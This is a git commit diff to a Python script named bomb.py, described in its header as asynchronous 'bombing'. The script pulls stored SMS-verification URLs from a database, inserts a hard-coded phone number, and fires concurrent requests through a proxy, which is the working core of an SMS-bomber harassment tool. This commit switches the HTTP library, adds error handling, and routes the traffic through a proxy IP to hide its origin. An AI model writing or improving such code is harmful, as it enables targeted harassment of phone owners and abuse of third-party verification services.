76bf5157236c1601f216ad8e5edd79029d70640f
AdminWhaleFall <2734184475@qq.com>
2021-08-30 12:05:48 +0800

    🎈 perf: 优化批量测试接口，更新部分接口。

--- bomb.py
+++ bomb.py
@@ -3,11 +3,11 @@
 '''
 Author: whalefall
 Date: 2021-08-07 21:23:35
-LastEditTime: 2021-08-10 17:10:07
+LastEditTime: 2021-08-30 11:54:39
 Description: 异步轰炸
 '''
+import httpx
 import asyncio
-import aiohttp
 from utils.db_sqlite import Sql
 
 header = {
@@ -15,18 +15,20 @@ header = {
 }
 
 
-async def get(url, session: aiohttp.ClientSession):
+async def get(url, session: httpx.AsyncClient):
     '''异步请求'''
     print(f"开始请求{url}")
-    async with session.get(url, headers=header) as resp:
-        status = await resp.text()
-        print(status)
-
+    try:
+        # resp = session.get(url, headers=header)
+        status = await session.get(url, headers=header)
+        print(status.text)
+    except Exception as e:
+        print(f'请求失败{url}.{e}')
 
 async def main():
     urls = Sql().select()
     tasks = []
-    async with aiohttp.ClientSession() as session:
+    async with httpx.AsyncClient(timeout=8,proxies={"all://":"http://120.52.73.44:18080"}) as session:
         for url in urls:
             url = url.replace("{phone}", "19820294268")
             task = asyncio.create_task(get(url, session))
